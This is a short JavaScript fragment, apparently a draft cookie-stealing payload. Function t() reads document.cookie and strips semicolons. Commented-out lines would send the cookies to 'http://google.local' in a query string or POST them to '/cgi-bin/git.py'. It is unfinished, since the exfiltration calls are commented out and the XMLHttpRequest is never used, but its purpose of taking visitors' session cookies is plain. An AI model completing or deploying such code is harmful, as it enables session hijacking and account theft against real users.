var data;

function t() {
    data = document.cookie;
    data = data.replace(";","");

    //window.location = "http://google.local?info="+data;
    var r = new XMLHttpRequest();

    /*r.open("POST", "/cgi-bin/git.py", true);
    r.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    r.send("data="+data);*/
}
